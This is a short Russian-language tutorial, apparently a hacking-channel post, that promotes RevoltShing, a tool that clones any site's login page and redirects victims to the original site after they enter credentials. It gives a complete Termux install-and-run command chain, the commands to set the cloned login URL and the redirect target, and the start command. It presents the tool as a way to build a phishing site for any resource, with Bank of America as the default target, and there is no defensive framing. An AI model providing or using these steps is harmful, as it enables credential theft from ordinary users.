RevoltShing - это один из таких инструментов, он может скопировать абсолютно любой сайт/сервис/портал, имеет встроенную функцию перенаправления после ввода данных авторизации на оригинальную страницу скопированного сайта.

Установка в Termux (https://play.google.com/store/apps/details?id=com.termux):

pkg install git && git clone https://github.com/AngelSecurityTeam/RevoltShing && cd RevoltShing && pkg install python -y && pip3 install wget && pkg install wget && pip3 install bs4 && pip3 install requests && python3 Server.py && python3 revoltshing.py

Этой большой командой мы установили все зависимости и запустили утилиту

Как юзать:

Перед вами появится консоль, где система по стандарту предложит клонировать сайт Банка Америки.

Поменять настройки можно командой

edit url https://<страница авторизации  (https://t.me/joinchat/AAAAAEwEGATsctWH3xNNSQ)нужного ресурса>

Перенаправление меняется командой

edit url_destination https://<куда направить пользователя после ввода данных>

Для старта просто вписываем

start

Готово. Вот так просто, без знаний языков программирования, возможно создать фишинговый сайт абсолютно любого ресурса

АВТОР - AngelSecurityTeam(https://github.com/AngelSecurityTeam)